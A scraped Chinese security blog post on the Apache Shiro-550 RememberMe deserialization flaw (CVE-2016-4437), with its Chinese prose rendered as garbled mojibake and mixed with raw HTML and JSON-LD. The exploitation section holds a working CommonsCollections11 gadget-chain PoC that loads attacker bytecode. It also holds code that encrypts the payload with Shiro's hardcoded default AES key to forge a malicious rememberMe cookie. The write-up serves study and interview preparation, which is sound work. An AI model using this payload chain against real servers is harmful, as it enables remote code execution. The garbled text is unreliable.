æ²¡æœ‰è¿›è¡Œè®¤è¯å‰ã€‚\nè®¤è¯åï¼š\nlogoutï¼Œé€€å‡ºç™»å½•ä¹‹åï¼Œä¼šæ³¨é”€æ‰æˆ‘ä»¬çš„æƒé™å’Œè®¤è¯çš„ç”¨æˆ·ï¼Œå†æ¬¡è®¿é—®/indexï¼Œä¼šé‡å®šå‘åˆ°/loginè·¯å¾„ã€‚\nShiro-550æ¼æ´åˆ†æ æ¼æ´ä¿¡æ¯ æ¼æ´ä¿¡æ¯ è¯¦æƒ… æ¼æ´ç¼–å· CVE-2016-4437 / CNVD-2016-03869 / SHIRO-550 å½±å“ç‰ˆæœ¬ shiro 1.x \u003c 1.2.5 æ¼æ´æè¿° å¦‚æœç¨‹åºæœªèƒ½æ­£ç¡®é…ç½® â€œremember meâ€ åŠŸèƒ½ä½¿ç”¨çš„å¯†é’¥ã€‚ æ”»å‡»è€…å¯é€šè¿‡å‘é€å¸¦æœ‰ç‰¹åˆ¶å‚æ•°çš„è¯·æ±‚åˆ©ç”¨è¯¥æ¼æ´æ‰§è¡Œä»»æ„ä»£ç æˆ–è®¿é—®å—é™åˆ¶å†…å®¹ã€‚ æ¼æ´å…³é”®å­— cookie | RememberMe | ååºåˆ—åŒ– | ç¡¬ç¼–ç  | AES æ¼æ´è¡¥ä¸ Commit-4d5bb00 ç›¸å…³é“¾æ¥ SHIRO-441 https://www.anquanke.com/post/id/192619 æ¼æ´è¯¦è§£ Shiro ä» 0.9 ç‰ˆæœ¬å¼€å§‹è®¾è®¡äº† RememberMe çš„åŠŸèƒ½ï¼Œç”¨æ¥æä¾›åœ¨åº”ç”¨ä¸­è®°ä½ç”¨æˆ·ç™»é™†çŠ¶æ€çš„åŠŸèƒ½ã€‚\nRememberMeManager é¦–å…ˆæ˜¯æ¥å£ org.apache.shiro.mgt.RememberMeManagerï¼Œè¿™ä¸ªæ¥å£æä¾›äº† 5 ä¸ªæ–¹æ³•ï¼š\ngetRememberedPrincipalsï¼šåœ¨æŒ‡å®šä¸Šä¸‹æ–‡ä¸­æ‰¾åˆ°è®°ä½çš„ principalsï¼Œä¹Ÿå°±æ˜¯ RememberMe çš„åŠŸèƒ½ã€‚ forgetIdentityï¼šå¿˜è®°èº«ä»½æ ‡è¯†ã€‚ onSuccessfulLoginï¼šåœ¨ç™»é™†æ ¡éªŒæˆåŠŸåè°ƒç”¨ï¼Œç™»é™†æˆåŠŸæ—¶ï¼Œä¿å­˜å¯¹åº”çš„ principals ä¾›ç¨‹åºæœªæ¥è¿›è¡Œè®¿é—®ã€‚ onFailedLoginï¼šåœ¨ç™»é™†å¤±è´¥åè°ƒç”¨ï¼Œç™»é™†å¤±è´¥æ—¶ï¼Œåœ¨ç¨‹åºä¸­â€œå¿˜è®°â€è¯¥ Subject å¯¹åº”çš„ principalsã€‚ onLogout: åœ¨ç”¨æˆ·é€€å‡ºæ—¶è°ƒç”¨ï¼Œå½“ä¸€ä¸ª Subject æ³¨é”€æ—¶ï¼Œåœ¨ç¨‹åºä¸­â€œå¿˜è®°â€è¯¥ Subject å¯¹åº”çš„ principalsã€‚ AbstractRememberMeManager åŒæ—¶ï¼ŒShiro è¿˜æä¾›äº†ä¸€ä¸ªå®ç°äº† RememberMeManager æ¥å£çš„æŠ½è±¡ç±» AbstractRememberMeManagerï¼Œæä¾›äº†ä¸€äº›å®ç°æŠ€æœ¯ç»†èŠ‚ã€‚å…ˆä»‹ç»å…¶ä¸­é‡è¦çš„å‡ ä¸ªæˆå‘˜å˜é‡ï¼š\nDEFAULT_CIPHER_KEY_BYTESï¼šä¸€ä¸ª Base64 çš„ç¡¬ç¼–ç çš„ AES Keyï¼Œä¹Ÿæ˜¯æœ¬æ¬¡æ¼æ´çš„å…³é”®ç‚¹ï¼Œè¿™ä¸ª key ä¼šè¢«åŒæ—¶è®¾ç½®ä¸ºåŠ è§£å¯† key æˆå‘˜å˜é‡ï¼šencryptionCipherKey/decryptionCipherKey ã€‚ serializerï¼šShiro æä¾›çš„åºåˆ—åŒ–å™¨ï¼Œç”¨æ¥å¯¹åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ ‡è¯†ç”¨æˆ·èº«ä»½çš„ PrincipalCollection å¯¹è±¡ã€‚ cipherServiceï¼šç”¨æ¥å¯¹æ•°æ®åŠ è§£å¯†çš„ç±»ï¼Œå®é™…ä¸Šæ˜¯ org.apache.shiro.crypto.AesCipherService ç±»ï¼Œè¿™æ˜¯ä¸€ä¸ªå¯¹ç§°åŠ å¯†çš„å®ç°ï¼Œæ‰€ä»¥åŠ è§£å¯†çš„ key æ˜¯ä½¿ç”¨äº†åŒä¸€ä¸ªã€‚ åœ¨å…¶åˆå§‹åŒ–æ—¶ï¼Œä¼šåˆ›å»º DefaultSerializer ä½œä¸ºåºåˆ—åŒ–å™¨ï¼ŒAesCipherService ä½œä¸ºåŠ è§£å¯†å®ç°ç±»ï¼ŒDEFAULT_CIPHER_KEY_BYTES ä½œä¸ºåŠ è§£å¯†çš„ keyã€‚\nCookieRememberMeManager åœ¨ shiro-web åŒ…ä¸­æä¾›äº†å…·ä½“çš„å®ç°ç±» CookieRememberMeManagerï¼Œå®ç°äº†åœ¨ HTTP æ— çŠ¶æ€åè®®ä¸­ä½¿ç”¨ cookie è®°å½•ç”¨æˆ·ä¿¡æ¯çš„ç›¸å…³èƒ½åŠ›ã€‚å…¶ä¸­ä¸€ä¸ªæ¯”è¾ƒé‡è¦çš„æ–¹æ³•æ˜¯ getRememberedSerializedIdentityï¼Œå…·ä½“é€»è¾‘å¦‚ä¸‹å›¾ï¼š\nç®€å•æ¥è¯´å°±æ˜¯å®ç°äº†ï¼Œè¯»å–Cookieçš„å€¼ï¼Œç„¶åbase64è§£å¯†å¹¶è¿”å›å­—èŠ‚æ•°ç»„ã€‚\næ¼æ´åˆ†æ åœ¨ Filter å¤„ç†æµç¨‹ä¸­ï¼Œæ— è®ºæ˜¯ ShiroFilter è¿˜æ˜¯ IniShiroFilterï¼Œ doFilter æ–¹æ³•éƒ½æ˜¯ç»§æ‰¿è‡³ AbstractShiroFilterï¼Œä¼šè°ƒç”¨ AbstractShiroFilter#doFilterInternal æ–¹æ³•ï¼Œä½¿ç”¨ä¿å­˜çš„ SecurityManager åˆ›å»º Subject å¯¹è±¡ã€‚å…·ä½“è°ƒç”¨æµç¨‹å¤§æ¦‚å¦‚ä¸‹ï¼š\nåˆ›å»º Subject å¯¹è±¡åï¼Œä¼šè¯•å›¾ä»åˆ©ç”¨å½“å‰çš„ä¸Šä¸‹æ–‡ä¸­çš„ä¿¡æ¯æ¥è§£æå½“å‰ç”¨æˆ·çš„èº«ä»½ï¼Œå°†ä¼šè°ƒç”¨ DefaultSecurityManager#resolvePrincipals æ–¹æ³•ï¼Œç»§ç»­è°ƒç”¨ AbstractRememberMeManager#getRememberedPrincipals æ–¹æ³•ï¼Œå¦‚ä¸‹å›¾ï¼š\nç„¶åè°ƒç”¨org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentityæ–¹æ³•æ¥å°†Cookieè¿›è¡Œbase64è§£å¯†ã€‚\nç„¶åè°ƒç”¨org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipalsæ–¹æ³•ï¼Œé‡Œé¢å…³æ³¨decryptæ–¹æ³•å’Œdeserializeæ–¹æ³•ã€‚\ndecryptæ–¹æ³•æ˜¯AesCipherService è¿›è¡Œè§£å¯†ã€‚\nåœ¨ Shiro ä¸­ï¼Œåºåˆ—åŒ–å™¨çš„é»˜è®¤å®ç°æ˜¯ DefaultSerializerï¼Œå¯ä»¥çœ‹åˆ°å…¶ deserialize æ–¹æ³•ä½¿ç”¨ Java åŸç”Ÿååºåˆ—åŒ–ï¼Œä½¿ç”¨ ByteArrayInputStream å°† byte è½¬ä¸º ObjectInputStream ï¼Œå¹¶è°ƒç”¨ readObject æ–¹æ³•æ‰§è¡Œååºåˆ—åŒ–æ“ä½œã€‚\nä»¥ä¸Šå°±æ˜¯ Shiro åˆ›å»º Subject æ—¶æ‰§è¡Œçš„é€»è¾‘ï¼Œè·Ÿä¸‹æ¥åå°±çœ‹åˆ°äº†å®Œæ•´çš„æ¼æ´è§¦å‘é“¾ï¼š\næ”»å‡»è€…æ„é€ æ¶æ„çš„ååºåˆ—åŒ–æ•°æ®ï¼Œä½¿ç”¨ç¡¬ç¼–ç çš„ AES åŠ å¯†ï¼Œç„¶å Base64 ç¼–ç æ”¾åœ¨ Cookie ä¸­ï¼Œå³å¯è§¦å‘æ¼æ´åˆ©ç”¨ã€‚\næ¼æ´åˆ©ç”¨ è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨ cc11 æ¥åŠ è½½æˆ‘ä»¬çš„æ¶æ„ä»£ç æ¥æ‰“è¿‡å»ï¼Œcc11 çš„å¥½å¤„åœ¨äºå¯ä»¥ç›´æ¥åŠ è½½å­—èŠ‚ç ï¼Œä¾‹å¦‚ cc6 å’Œ cc11çš„åŒºåˆ«å°±æ˜¯ä¸€ä¸ªæ˜¯å‘½ä»¤æ‰§è¡Œä¸€ä¸ªæ˜¯ä»£ç æ‰§è¡Œï¼Œç›¸æ¯”ä¹‹ä¸‹è‚¯å®šæ˜¯æˆ‘ä»¬çš„ä»£ç æ‰§è¡Œå±å®³æ¯”è¾ƒå¤§\nShiro ä½¿ç”¨ ClassResolvingObjectInputStream æ‰§è¡Œååºåˆ—åŒ–çš„æ“ä½œï¼Œè¿™ä¸ªç±»é‡å†™äº† resolveClass ï¼Œå®é™…ä½¿ç”¨ ClassLoader.loadClass() æ–¹å¼è€Œé ObjectInputStream ä¸­çš„ Class.forName() çš„æ–¹å¼ã€‚è€Œ forName çš„æ–¹å¼å¯ä»¥åŠ è½½ä»»æ„çš„æ•°ç»„ç±»å‹ï¼ŒloadClass åªèƒ½åŠ è½½åŸç”Ÿçš„ç±»å‹çš„ Object Arrayã€‚\nåœ¨ä»£ç å®¡è®¡çŸ¥è¯†æ˜Ÿçƒä¸­çš„ã€ŠJavaå®‰å…¨æ¼«è°ˆ - 15.TemplatesImplåœ¨Shiroä¸­çš„åˆ©ç”¨.pdfã€‹ åŠ ã€ŠShiro-1-2-4-RememberMeååºåˆ—åŒ–æ¼æ´åˆ†æ-CVE-2016-4437.pdfã€‹ä¸¤ç¯‡æ–‡ç« ä¸­é’ˆå¯¹æ­¤é—®é¢˜è¿›è¡Œäº†è®¨è®ºå’Œè°ƒè¯•ã€‚\ncc11 çš„ Poc\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 public class CC11 { public static void setFieldValue(Object obj, String fileNmae, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fileNmae); field.setAccessible(true); field.set(obj,value); } public static void main(String[] args) throws Exception { // æ„é€ æ¶æ„ TemplatesImpl å¯¹è±¡ TemplatesImpl obj = new TemplatesImpl(); // è·å–æ¶æ„ç±»çš„å­—èŠ‚ç  byte[] code = Files.readAllBytes(Paths.get(\"/Users/reus09/Desktop/JavaSec/Deserializer/target/classes/CC11/EvilClass.class\")); byte[][] codes = {code}; // åå°„ä¿®æ”¹å±æ€§ setFieldValue(obj, \"_bytecodes\", new byte[][] {code}); setFieldValue(obj, \"_name\", \"HelloTemplatesImpl\"); setFieldValue(obj, \"_tfactory\", new TransformerFactoryImpl()); // ================ // åˆ©ç”¨ InvokerTransformer è°ƒç”¨ TemplatesImpl.newTransformer InvokerTransformer invokerTransformer = new InvokerTransformer(\"newTransformer\", null, null); // å‡çš„é“¾å­ Transformer fakeTransformer = new ConstantTransformer(1); //=============== Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, fakeTransformer); TiedMapEntry tme = new TiedMapEntry(outerMap, obj); Map expMap = new HashMap(); expMap.put(tme, \"valuevalue\"); innerMap.remove(obj); setFieldValue(outerMap, \"factory\", invokerTransformer); // ============== // ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸² ObjectOutputStream oss = new ObjectOutputStream(new FileOutputStream(\"./cc11.bin\")); oss.writeObject(expMap); oss.close(); ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\"./cc11.bin\")); Object o = (Object) ois.readObject(); } } è¿è¡Œ cc11 çš„ poc ç”Ÿæˆå¯¹åº”æ–‡ä»¶ï¼Œç„¶ååˆ©ç”¨å¦‚ä¸‹ä»£ç è¿›è¡ŒåŠ å¯†ç”Ÿæˆ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 public static byte[] getBytes(String path) throws Exception{ InputStream inputStream = new FileInputStream(path); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); int n = 0; while ((n=inputStream.read())!=-1){ byteArrayOutputStream.write(n); } byte[] bytes = byteArrayOutputStream.toByteArray(); return bytes; } public static void main(String[] args) throws Exception{ String path = \"/Users/reus09/Desktop/JavaSec/cc11.bin\"; byte[] key = Base64.decode(\"kPH+bIxk5D2deZiIxcaaaA==\"); AesCipherService aes = new AesCipherService(); ByteSource ciphertext = aes.encrypt(getBytes(path), key); System.out.printf(ciphertext.toString()); } } æ”»å‡»ï¼š æ¼æ´ç–‘æƒ‘ è¿™é‡Œè®²ä¸€ä¸‹ä¸ºä»€ä¹ˆCookieçš„keyè¦ä¸ºrememberMeã€‚\nåœ¨è°ƒç”¨è°ƒç”¨org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentityæ–¹æ³•çš„æ—¶å€™ã€‚\nCookieRememberMeManagerçš„æ„é€ å‡½æ•°ä¼šåˆå§‹åŒ–ä¸€ä¸ªç±»SimpleCookieï¼Œæ¥å­˜å‚¨æˆ‘ä»¬ä¼ è¾“çš„Cookieçš„keyå’Œvalueã€‚\næ ¹æ®SimpleCookieçš„æ„é€ å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°rememberMeä½œä¸ºå­—ç¬¦ä¸²ä¼ å…¥ï¼Œä½œä¸ºcookieçš„nameã€‚\nç„¶ååœ¨org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentityæ–¹æ³•ä¸­ä½¿ç”¨org.apache.shiro.web.servlet.SimpleCookie#readValueæ–¹æ³•æ¥æ ¹æ®åˆå§‹åŒ–ä¼ å…¥çš„name:rememberMeè¯»å–requestè¯·æ±‚ä¸­çš„cookieï¼Œå¦‚æœä¸ä¸ºç©ºï¼Œå°±å°†å…¶cookieå¯¹åº”çš„valueè¿”å›ã€‚\næ¥ä¸‹æ¥å°±æ˜¯æˆ‘ä»¬çš„base64è§£å¯†è¿‡ç¨‹ï¼Œå°±ä¸åœ¨èµ˜è¿°ã€‚\n",
  "wordCount" : "6300",
  "inLanguage": "en",
  "datePublished": "2023-03-19T14:04:48+08:00",
  "dateModified": "2023-03-19T14:04:48+08:00",
  "author":[{
    "@type": "Person",
    "name": "Reus09"
  }],
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "/posts/tech/shiro-550%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Reus09's Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="" accesskey="h" title="Reus09&#39;s Blog (Alt + H)">Reus09&#39;s Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="search" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="posts" title="Posts">
                    <span>Posts</span>
                </a>
            </li>
            <li>
                <a href="archives/" title="Archives">
                    <span>Archives</span>
                </a>
            </li>
            <li>
                <a href="categories" title="Categories">
                    <span>Categories</span>
                </a>
            </li>
            <li>
                <a href="tags" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
            <li>
                <a href="about" title="About">
                    <span>About</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="">Home</a>&nbsp;Â»&nbsp;<a href="/posts/">ğŸ“šæ–‡ç« </a>&nbsp;Â»&nbsp;<a href="/posts/tech/">ğŸ‘¨ğŸ»â€ğŸ’»æŠ€æœ¯</a></div>
    <h1 class="post-title">
      Shiro 550æ¼æ´å­¦ä¹ 
    </h1>
    <div class="post-meta"><span title='2023-03-19 14:04:48 +0800 +0800'>2023-03-19</span>&nbsp;Â·&nbsp;13 min&nbsp;Â·&nbsp;Reus09

</div>
  </header> <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details  open>
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">Table of Contents</span>
            </summary>

            <div class="inner"><ul>
                    <li>
                        <a href="#%e5%89%8d%e8%a8%80" aria-label="å‰è¨€">å‰è¨€</a></li>
                    <li>
                        <a href="#shiro%e7%ae%80%e5%8d%95%e4%bb%8b%e7%bb%8d" aria-label="Shiroç®€å•ä»‹ç»">Shiroç®€å•ä»‹ç»</a><ul>
                            
                    <li>
                        <a href="#shiro%e4%b8%bb%e8%a6%81%e5%ae%9e%e7%8e%b0%e5%8a%9f%e8%83%bd" aria-label="Shiroä¸»è¦å®ç°åŠŸèƒ½">Shiroä¸»è¦å®ç°åŠŸèƒ½</a></li>
                    <li>
                        <a href="#shiro%e4%b8%bb%e8%a6%81%e7%9a%84%e7%b1%bb" aria-label="shiroä¸»è¦çš„ç±»">shiroä¸»è¦çš„ç±»</a><ul>
                            
                    <li>
                        <a href="#securitymanager" aria-label="SecurityManager">SecurityManager</a></li>
                    <li>
                        <a href="#subject" aria-label="Subject">Subject</a></li>
                    <li>
                        <a href="#realm" aria-label="Realm">Realm</a></li></ul>
                    </li>
                    <li>
                        <a href="#shiro%e7%ae%80%e5%8d%95%e4%bd%bf%e7%94%a8" aria-label="Shiroç®€å•ä½¿ç”¨">Shiroç®€å•ä½¿ç”¨</a></li></ul>
                    </li>
                    <li>
                        <a href="#shiro-550%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90" aria-label="Shiro-550æ¼æ´åˆ†æ">Shiro-550æ¼æ´åˆ†æ</a><ul>
                            
                    <li>
                        <a href="#%e6%bc%8f%e6%b4%9e%e4%bf%a1%e6%81%af" aria-label="æ¼æ´ä¿¡æ¯">æ¼æ´ä¿¡æ¯</a></li>
                    <li>
                        <a href="#%e6%bc%8f%e6%b4%9e%e8%af%a6%e8%a7%a3" aria-label="æ¼æ´è¯¦è§£">æ¼æ´è¯¦è§£</a><ul>
                            <ul>
                            
                    <li>
                        <a href="#remembermemanager" aria-label="RememberMeManager">RememberMeManager</a></li>
                    <li>
                        <a href="#abstractremembermemanager" aria-label="AbstractRememberMeManager">AbstractRememberMeManager</a></li>
                    <li>
                        <a href="#cookieremembermemanager" aria-label="CookieRememberMeManager">CookieRememberMeManager</a></li></ul>
                        </ul>
                    </li>
                    <li>
                        <a href="#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90" aria-label="æ¼æ´åˆ†æ">æ¼æ´åˆ†æ</a></li>
                    <li>
                        <a href="#%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8" aria-label="æ¼æ´åˆ©ç”¨">æ¼æ´åˆ©ç”¨</a></li>
                    <li>
                        <a href="#%e6%bc%8f%e6%b4%9e%e7%96%91%e6%83%91" aria-label="æ¼æ´ç–‘æƒ‘">æ¼æ´ç–‘æƒ‘</a>
                    </li>
                </ul>
                </li>
                </ul>
            </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    window.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();

        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
         
         activeElement = elements[0];
         const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
         document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
     }, false);

    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);

    window.addEventListener('scroll', () => {
        
        activeElement = Array.from(elements).find((element) => {
            if ((getOffsetTop(element) - window.pageYOffset) > 0 && 
                (getOffsetTop(element) - window.pageYOffset) < window.innerHeight/2) {
                return element;
            }
        }) || activeElement

        elements.forEach(element => {
             const id = encodeURI(element.getAttribute('id')).toLowerCase();
             if (element === activeElement){
                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
             } else {
                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.remove('active');
             }
         })
     }, false);

    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);

    function checkTocPosition() {
        const width = document.body.scrollWidth;

        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }

    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;   
    }
</script>

  <div class="post-content"><h2 id="å‰è¨€">å‰è¨€<a hidden class="anchor" aria-hidden="true" href="#å‰è¨€">#</a></h2>
<p>ä¹‹å‰å‚åŠ è¿‡æŠ¤ç½‘çš„é¢è¯•ï¼Œæ€»å–œæ¬¢é—®<code>shiro-550</code>æ¼æ´çš„åŸç†å’Œåˆ©ç”¨æ–¹å¼ï¼Œå†åŠ ä¸Šç°åœ¨åœ¨è¿›è¡ŒJAVAå®‰å…¨çš„å­¦ä¹ ï¼ŒShiroä½œä¸ºJavaå¼€å‘ä¸­ä¸€ä¸ªå¾ˆé‡è¦çš„Javaå®‰å…¨æ¡†æ¶ï¼Œè¿™é‡Œä¹Ÿå°±è·Ÿè¿›å­¦ä¹ ä¸€ä¸‹shiroå­˜åœ¨çš„ä¸€äº›å†å²æ¼æ´ã€‚</p>
<p>æ ¹æ®å®˜æ–¹ç½‘ç«™ä¸Šçš„<a href="https://shiro.apache.org/security-reports.html">æ¼æ´é€šæŠ¥</a>ï¼Œ<code>Shiro</code> åœ¨å†å²ä¸Šå…±é€šæŠ¥äº† <code>11</code> ä¸ª <code>CVE</code>ï¼Œé™¤äº† <code>SHIRO-550</code> å’Œ<code>SHIRO-721</code>çš„ååºåˆ—åŒ–ä»¥åŠ CVE-2014-0074 çš„ ldap ç»•è¿‡ä¹‹å¤–ï¼Œå…¶ä»–çš„ç»•è¿‡éƒ½æ˜¯åœ¨è·¯å¾„å¤„ç†è¿‡ç¨‹ä¸­äº§ç”Ÿé—®é¢˜å¯¼è‡´çš„ç»•è¿‡ã€‚</p>
<p>è¿™äº›ç»•è¿‡å¤šæ•°æ˜¯ç”±äº shiro çš„å¤„ç†é€»è¾‘æœ‰è¯¯ï¼Œæˆ–å’Œä¸­é—´ä»¶ã€å…¶ä»–æ¡†æ¶çš„å¤„ç†é€»è¾‘ä¸ä¸€è‡´å¯¼è‡´çš„å®‰å…¨é—®é¢˜ï¼Œé€šå¸¸ä¼šä¾èµ–åœºæ™¯ã€‚</p>
<p>è¿™é‡Œå°±å…ˆå¯¹æœ€ç®€å•çš„<code>shrio-550</code>ä»¥å¥‘å­è¿›è¡Œå­¦ä¹ ,åŒæ—¶ç®€å•å­¦ä¹ ä¸€ä¸‹<code>Shiro</code>å…·ä½“æ˜¯ä»€ä¹ˆä¸œè¥¿ã€‚</p>
<h2 id="shiroç®€å•ä»‹ç»">Shiroç®€å•ä»‹ç»<a hidden class="anchor" aria-hidden="true" href="#shiroç®€å•ä»‹ç»">#</a></h2>
<h3 id="shiroä¸»è¦å®ç°åŠŸèƒ½">Shiroä¸»è¦å®ç°åŠŸèƒ½<a hidden class="anchor" aria-hidden="true" href="#shiroä¸»è¦å®ç°åŠŸèƒ½">#</a></h3>
<p><a href="https://shiro.apache.org/">Apache Shiro</a> æ˜¯ä¸€ä¸ª Java å®‰å…¨æ¡†æ¶ï¼ŒåŒ…æ‹¬å¦‚ä¸‹åŠŸèƒ½å’Œç‰¹æ€§ï¼š</p>
<ul>
<li><a href="https://shiro.apache.org/authentication-features.html">Authentication</a>ï¼šèº«ä»½è®¤è¯/ç™»é™†ï¼ŒéªŒè¯ç”¨æˆ·æ˜¯ä¸æ˜¯æ‹¥æœ‰ç›¸åº”çš„èº«ä»½ã€‚åœ¨ Shiro ä¸­ï¼Œæ‰€æœ‰çš„æ“ä½œéƒ½æ˜¯åŸºäºå½“å‰æ­£åœ¨æ‰§è¡Œçš„ç”¨æˆ·ï¼Œè¿™é‡Œç§°ä¹‹ä¸ºä¸€ä¸ª <code>Subject</code>ï¼Œåœ¨ç”¨æˆ·ä»»æ„ä»£ç ä½ç½®éƒ½å¯ä»¥è½»æ˜“å–åˆ°è¿™ä¸ª<code>Subject</code>ã€‚Shiro æ”¯æŒæ•°æ®æºï¼Œç§°ä¹‹ä¸º <code>Realms</code>ï¼Œå¯ä»¥åˆ©ç”¨å…¶è¿æ¥ LDAP\AD\JDBC ç­‰å®‰å…¨æ•°æ®æºï¼Œå¹¶æ”¯æŒä½¿ç”¨è‡ªå®šä¹‰çš„ <code>Realms</code>ï¼Œå¹¶å¯ä»¥åŒæ—¶ä½¿ç”¨ä¸€ä¸ªæˆ–å¤šä¸ª <code>Realms</code> å¯¹ä¸€ä¸ªç”¨æˆ·è¿›è¡Œè®¤è¯ï¼Œè®¤è¯è¿‡ç¨‹å¯ä»¥ä½¿ç”¨é…ç½®æ–‡ä»¶é…ç½®ï¼Œæ— éœ€ä¿®æ”¹ä»£ç ã€‚åŒæ—¶ï¼ŒShiro è¿˜æ”¯æŒ RememberMeï¼Œè®°ä½åä¸‹æ¬¡è®¿é—®å°±æ— éœ€ç™»å½•ã€‚</li>
<li><a href="https://shiro.apache.org/authorization-features.html">Authorization</a>ï¼šæˆæƒï¼Œå³æƒé™éªŒè¯ï¼ŒéªŒè¯æŸä¸ªå·²è®¤è¯çš„ç”¨æˆ·æ˜¯å¦æ‹¥æœ‰æŸä¸ªæƒé™ã€‚åŒæ ·åŸºäº <code>Subject</code>ã€æ”¯æŒå¤šç§ <code>Realms</code>ã€‚Shiro æ”¯æŒ <code>Wildcard Permissions</code> ï¼Œä¹Ÿå°±æ˜¯ä½¿ç”¨é€šé…ç¬¦æ¥å¯¹æƒé™éªŒè¯è¿›è¡Œå»ºæ¨¡ï¼Œä½¿æƒé™é…ç½®ç®€å•æ˜“è¯»ã€‚Shiro æ”¯æŒåŸºäº <code>Roles</code> å’ŒåŸºäº <code>Permissions</code> ä¸¤ç§æ–¹å¼çš„éªŒè¯ï¼Œå¯ä»¥æ ¹æ®éœ€è¦è¿›è¡Œä½¿ç”¨ã€‚å¹¶ä¸”æ”¯æŒç¼“å­˜äº§å“çš„ä½¿ç”¨ã€‚</li>
